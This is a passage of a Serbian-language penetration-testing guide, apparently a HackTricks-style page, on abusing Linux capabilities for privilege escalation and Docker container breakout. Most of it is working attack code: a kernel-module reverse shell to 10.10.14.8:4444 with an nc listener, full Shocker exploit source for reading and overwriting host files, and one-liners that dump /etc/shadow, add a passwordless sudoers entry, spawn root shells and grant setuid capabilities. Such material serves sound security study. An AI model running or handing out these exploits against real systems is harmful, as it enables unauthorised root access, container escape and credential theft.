1. Utvrdite **arhitekturu** `uname -m`
2. Pronađite **shellcode** za tu arhitekturu ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Pronađite **program** za **ubacivanje** **shellcode-a** u memoriju procesa ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Izmenite** **shellcode** unutar programa i **kompajlirajte** ga `gcc inject.c -o inject`
5. **Ubacite** ga i preuzmite svoju **shell** sesiju: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava procesu da **učitava i uklanja kernel module (sistemski pozivi `init_module(2)`, `finit_module(2)` i `delete_module(2))`**, čime dobija direktan pristup osnovnim operacijama kernela. Ova capability predstavlja kritičan bezbednosni rizik jer učitavanje modula može da izmeni ponašanje kernela i potencijalno zaobiđe granice izolacije.<sup>[[6]](#references)[[14]](#references)</sup>
U običnom rootful Linux kontejneru, ovo cilja **zajednički host kernel** i zato predstavlja direktan breakout. Capability mora biti efektivna u početnom user namespace-u jer učitavanje modula nije namespaced. Runtime okruženje izolovano pomoću userspace kernela ili VM-a, kao što su gVisor, Kata ili Hyper-V, menja granicu kernela kojoj se može pristupiti. Učitavanje modula i dalje mogu da blokiraju `modules_disabled`, kernel lockdown, provera potpisa, seccomp ili LSM.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

U sledećem primeru, binarna datoteka **`python`** ima ovu capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Podrazumevano, komanda **`modprobe`** traži datoteke sa listom zavisnosti i mapama u direktorijumu **`/lib/modules/$(uname -r)`**.\
Da bismo ovo zloupotrebili, napravimo lažni direktorijum **lib/modules**:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Zatim **kompajlirajte kernel modul (u nastavku su 2 primera) i kopirajte ga** u ovu fasciklu:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Na kraju, izvršite potreban Python kod da biste učitali ovaj kernel modul:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Primer 2 sa binarnom datotekom**

U sledećem primeru binarna datoteka **`kmod`** ima ovu capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Što znači da je moguće koristiti komandu **`insmod`** za učitavanje kernel modula. Pratite primer ispod da biste dobili **reverse shell** zloupotrebom ove privilegije.

**Primer sa okruženjem (Docker breakout)**

Možete proveriti omogućene capabilities unutar Docker kontejnera pomoću:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

U prethodnom izlazu možete videti da je omogućena **SYS_MODULE** capability.<sup>[[14]](#references)</sup>

**Napravite** **kernel module** koji će izvršiti reverse shell i **Makefile** za njegovo **prevođenje**:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Znak za uvlačenje ispred svake make naredbe u Makefile-u **mora biti tabulator, a ne razmaci**!

Pokrenite make da biste ga kompajlirali.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Konačno, pokrenite `nc` unutar shell-a i **učitajte modul** iz drugog, pa ćete uhvatiti shell u nc procesu:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Kod ove tehnike preuzet je iz laboratorijske vežbe „Abusing SYS_MODULE Capability“ sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Još jedan primer ove tehnike možete pronaći na [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **zaobiđe dozvole za čitanje fajlova i za čitanje i izvršavanje direktorijuma**. Takođe mu omogućava da koristi `open_by_handle_at(2)`, koji tumači važeći file handle u odnosu na deskriptor fajla za mount istog montiranog fajl-sistema. Ova capability ne izlaže automatski svaki fajl izvan mount namespace-a procesa. Za izlazak iz ograničenja pomoću file handle-a dodatno su potrebni referenca na fajl-sistem relevantna za host, važeći ili dostupni handle-ovi, kompatibilan fajl-sistem i raspored skladišta, kao i odsustvo blokade runtime-a ili LSM-a. Istorijska Docker tehnika „Shocker“ demonstrirala je takvu kombinaciju u pogođenim konfiguracijama, kao što je analizirano [ovde](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**To znači da možete da zaobiđete provere dozvola za čitanje fajlova i provere dozvola za čitanje/izvršavanje direktorijuma**.<sup>[[14]](#references)</sup>

Kod **prilagođenog izvršnog fajla** koji ima ovu capability, proverite šta čita i vraća pozivaocu. Pomoćni program za skeniranje fajlova koji prihvata putanju do zaštićenog fajla koju odredi pozivalac i dužinu prefiksa koju odredi pozivalac, a zatim otkriva potpuni digest tog prefiksa, može da posluži kao oracle za čitanje fajlova: nakon što se otkrije prvih `n-1` bajtova, uporedite digeste kandidata za svaki mogući sledeći bajt sa digestom koji pomoćni program daje za dužinu `n`. Ovo ne zavisi od pronalaženja kriptografske kolizije niti konkretno od MD5; zavisi od ponovljenih upita sa izabranom dužinom i vidljivih, determinističkih digest-a. Digest celog fajla bez kontrole prefiksa ne omogućava isti postupak. Proverite da pozivalac može da izvrši pomoćni program, da capability fajla postaje efektivna, da je izabrana putanja dostupna u njegovom mount namespace-u i da takvo ponašanje ulaza/izlaza zaista postoji. Nemojte pokretati nepoznat privilegovani pomoćni program samo da biste to proverili tokom pasivnog prikupljanja informacija.

**Primer sa binarnim fajlom**

Binarni fajl može da čita fajlove koji su dostupni u njegovim namespace-ovima. Dakle, ako fajl kao što je `tar` ima ovu capability, može da čita shadow fajl:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Primer sa binary2**

U ovom slučaju, pretpostavimo da binarna datoteka **`python`** ima ovu mogućnost. Da biste izlistali fajlove korisnika root, možete da uradite sledeće:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

A da biste pročitali datoteku, možete da uradite:

```python
print(open("/etc/shadow", "r").read())
```

**Primer u okruženju (Docker breakout)**

Omogućene capabilities unutar Docker kontejnera možete proveriti pomoću `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

U prethodnom izlazu možete videti da je omogućena mogućnost **DAC_READ_SEARCH**. Ona zaobilazi DAC provere čitanja/pretrage i dozvoljava `open_by_handle_at(2)`; sama po sebi nije mogućnost za debugovanje procesa.<sup>[[14]](#references)</sup>

Kako funkcioniše sledeći exploit možete saznati na [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ali ukratko, **CAP_DAC_READ_SEARCH** omogućava prolazak kroz fajl sistem bez provera dozvola i dozvoljava `open_by_handle_at(2)`; tako mogu da se otkriju fajlovi koje su otvorili drugi procesi, ako su odgovarajući namespaces i mountovi dostupni.<sup>[[13]](#references)[[14]](#references)</sup>

Originalni exploit koji zloupotrebljava ove dozvole za čitanje fajlova sa hosta možete pronaći ovde: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); sledeći kod je **izmenjena verzija koja omogućava da kao prvi argument prosledite fajl za čitanje i sačuvate njegov sadržaj u fajl**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Exploit mora da pronađe pokazivač na nešto što je montirano na hostu. Originalni exploit koristio je datoteku /.dockerinit, a ova izmenjena verzija koristi /etc/hostname. Ako exploit ne radi, možda treba da podesite drugu datoteku. Da biste pronašli datoteku koja je montirana na hostu, samo izvršite komandu mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit mora da pronađe pokazivač na nešto što je montirano na hostu. Originalni exploit koristio je datoteku /.dockerinit, a ova izmenjena verzija koristi...](<../../images/image (407) (1).png>)

**Kod ove tehnike preuzet je iz laboratorijske vežbe „Abusing DAC_READ_SEARCH Capability“ sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Ova capability zaobilazi provere dozvola za čitanje i pisanje datoteka i većinu provera izvršavanja**; za izvršavanje obične datoteke i dalje je potrebno da bude postavljen najmanje jedan execute bit. Ona ne zaobilazi montiranje samo za čitanje, nepromenljivo stanje niti zabranu koju nametne LSM.<sup>[[14]](#references)</sup>

Potražite datoteke koje postaju čitljive ili upisive zahvaljujući članstvu u privilegovanoj grupi; korisne mete zavise od vlasništva nad datotekom i njenih bitova režima dozvola.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

U ovom primeru vim ima ovu capability, tako da možete da izmenite bilo koju datoteku, na primer _passwd_, _sudoers_ ili _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Primer sa izvršnom datotekom 2**

U ovom primeru, izvršna datoteka **`python`** imaće ovu capability. Možete da koristite python da biste prepisali bilo koju datoteku:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Primer sa okruženjem + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` dozvoljava `open_by_handle_at(2)`, ali **ne** zaobilazi provere dozvola za pisanje. Pisanje preko razrešenog handle-a dodatno zahteva dozvolu za pisanje za efektivni filesystem UID/GID procesa ili ACL, odnosno `CAP_DAC_OVERRIDE`. Referenca na filesystem relevantna za host, podržani file handle-ovi, filesystem montiran sa dozvolom za pisanje i runtime/LSM politika takođe moraju da dozvole ovu operaciju. Proverite efektivne capabilities i identitet; nijedna capability sama po sebi ne dokazuje da je cilj na hostu moguće menjati. Pogledajte [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) i [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Pre svega pročitajte prethodni odeljak koji [**zloupotrebljava DAC_READ_SEARCH capability za čitanje proizvoljnih fajlova**](linux-capabilities.md#cap_dac_read_search) sa hosta i **kompajlirajte** exploit.\
Sledeći istorijski primer pokušava da otvori razrešeni fajl pomoću `O_RDWR`; uspeva samo ako su ispunjeni prethodno navedeni uslovi za filesystem i dozvole za pisanje:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Da biste izašli iz Docker kontejnera, možete **preuzeti** datoteke `/etc/shadow` i `/etc/passwd` sa hosta, **dodati** im **novog korisnika** i pomoću **`shocker_write`** ih prepisati. Zatim **pristupite** preko **ssh**.

**Kod ove tehnike preuzet je iz laboratorijske vežbe „Abusing DAC_OVERRIDE Capability” sa** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Ova capability omogućava procesu da promeni vlasništvo nad datotekama**.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Pretpostavimo da **`python`** binarna datoteka ima ovu capability; možete promeniti vlasnika datoteke kao što je **`shadow`**, a zatim iskoristiti dobijeni pristup da je izmenite, ako to dozvoljavaju ostale dozvole:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Ili pomoću binarne datoteke **`ruby`** koja ima ovu mogućnost:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Ova capability zaobilazi provere vlasništva kod mnogih operacija nad datotekama, uključujući promenu dozvola**.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Ako Python ima ovu capability, možete da promenite dozvole shadow datoteke, **promenite root lozinku** i eskalirate privilegije:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Ova mogućnost omogućava procesu da promeni svoj efektivni korisnički ID, u skladu sa pravilima za akreditive i mogućnosti koje sprovodi kernel**.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Ako python ima ovu **mogućnost**, možete je veoma lako zloupotrebiti za eskalaciju privilegija na root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Drugi način:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Za **custom** izvršnu datoteku sa efektivnim `CAP_SETUID`, pregledajte dostupnu putanju izvršavanja koda umesto da pretpostavite da sama capability omogućava pokretanje shell-a. Tekst koji kontroliše pozivalac, prosleđen kao *format string* funkciji [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html), može da otkrije ili izmeni memoriju procesa; uspešna promena privilegija i dalje zavisi od ranjivog poziva, ulaza koji se može kontrolisati i kasnije radnje nakon `setuid(0)`. Ako ta radnja pokreće spoljašnji pomoćni program po imenu, proverite efektivni identitet pri njegovom pokretanju, stvarni `PATH` i da li je neki ranije pretraživani direktorijum upisiv i dostupan za prolaz pozivaocu. Neefektivna capability datoteke, `no_new_privs`, fiksna pouzdana putanja do pomoćnog programa ili nedostižna grana menjaju ishod. Pregledajte binarnu datoteku ili dostupan izvorni kod van mreže; tokom rutinskog popisivanja nemojte pokretati sumnjiv privilegovani pomoćni program.

## CAP_SETGID

**Ova capability omogućava procesu da promeni svoj efektivni ID grupe, uz poštovanje pravila za akreditive i capabilities koje sprovodi kernel**.<sup>[[14]](#references)</sup>

Postoji mnogo datoteka koje možete **prepisati radi eskalacije privilegija**; [**ideje možete pronaći ovde**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binarnom datotekom**

U ovom slučaju potražite zanimljive datoteke koje grupa može da čita, jer možete da se predstavljate kao bilo koja grupa:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Kada pronađete datoteku koju možete zloupotrebiti (čitanjem ili pisanjem) za eskalaciju privilegija, možete **dobiti shell pod identitetom zanimljive grupe** pomoću:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

U ovom slučaju, grupa shadow je imitirана, pa možete da pročitate datoteku `/etc/shadow`:

```bash
cat /etc/shadow
```

### Kombinovani lanac: CAP_SETGID + CAP_CHOWN

Kada su obe capabilities dostupne u istom helper-u, praktičan lanac je:

1. Promeni EGID u `shadow` (ili drugu privilegovanu grupu).
2. Upotrebi `chown` na `/etc/shadow` da postaviš svoj UID, uz zadržavanje grupe `shadow`.
3. Pročitaj ciljni hash i crackuj ga ili pivotiraj.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Ovim se izbegava potreba za direktnim pristupom root-u i često je dovoljno za pivot kroz ponovnu upotrebu kredencijala.

Ako je **docker** instaliran, možete **imitirati** grupu **docker** i zloupotrebiti je za komunikaciju sa [**docker socket-om** i eskalaciju privilegija](#writable-docker-socket).

## CAP_SETFCAP

**Ova capability omogućava procesu da postavlja file capabilities**.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Ako python ima ovu **capability**, možete je veoma lako zloupotrebiti za eskalaciju privilegija do root-a:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Novo upisani skup file capabilities zamenjuje prethodni skup; ako se zatim helper izvrši samo sa novim capabilities, možda više neće zadržati `CAP_SETFCAP` za ažuriranje drugog fajla.<sup>[[14]](#references)[[25]](#references)</sup>

Kada dobijete [SETUID capability](linux-capabilities.md#cap_setuid), možete otići na njen odeljak da vidite kako da eskalirate privilegije.

**Primer sa okruženjem (Docker breakout)**

Podrazumevani skup capabilities koji dokumentuje Docker uključuje **CAP_SETFCAP**, ali stvarni skup zavisi od konfiguracije runtime-a.<sup>[[19]](#references)</sup>
Možete pregledati capabilities procesa pomoću:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Ova mogućnost omogućava upisivanje capabilities datoteke, ali sama po sebi ne dodeljuje te capabilities trenutnom procesu niti zaobilazi pravila za datoteku, bounding set i namespace koja se primenjuju pri njenom izvršavanju.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Mogućnosti (capabilities) dozvoljene za fajl ograničene su capability bounding set-om procesa, a effective bit fajla određuje da li se dozvoljeni skup fajla dodaje u effective skup procesa. Zato dodavanje capabilities fajlu ne znači da će svaka zatražena capability automatski moći da se koristi prilikom izvršavanja.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava više osetljivih operacija, uključujući pristup uređajima `/dev/mem`, `/dev/kmem` ili `/proc/kcore`, izmenu vrednosti `mmap_min_addr`, pristup sistemskim pozivima `ioperm(2)` i `iopl(2)`, kao i raznim diskovnim komandama. Ova capability omogućava i `FIBMAP ioctl(2)`, što je ranije izazvalo probleme u [prošlosti](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Prema man stranici, ona takođe omogućava imaocu da izvršava niz operacija specifičnih za uređaj na drugim uređajima.<sup>[[14]](#references)</sup>

Ovo može biti korisno za **privilege escalation** i **Docker breakout**.<sup>[[14]](#references)</sup>

Sama capability ne izlaže koristan interfejs. Za breakout iz kontejnera potrebni su i dostupan host uređaj ili resurs, odgovarajuće dozvole za device-cgroup i fajl sistem, kao i tehnika specifična za hardver i kernel. Stroga ograničenja za `/dev/mem`, kernel lockdown, virtuelizacija, seccomp i LSM pravila često uklanjaju uobičajene puteve. Najpre proverite capability i izložene resurse:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

